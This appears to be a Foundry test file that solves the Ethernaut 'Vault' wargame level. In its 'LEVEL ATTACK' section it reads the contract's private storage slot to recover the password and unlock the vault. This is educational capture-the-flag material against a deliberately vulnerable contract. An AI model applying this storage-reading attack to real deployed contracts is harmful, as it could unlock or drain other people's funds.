pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Vault/VaultFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";


contract VaultTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testVaultHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        VaultFactory telephoneFactory = new VaultFactory();
        ethernaut.registerLevel(telephoneFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(telephoneFactory);
        Vault ethernautVault = Vault(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // bytes32(1) causes an error
        // TypeError: Explicit type conversion not allowed from "int_const 1" to "bytes32".
        bytes32 password = vm.load(address(ethernautVault), bytes32(uint256(1)));
        ethernautVault.unlock(password);


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
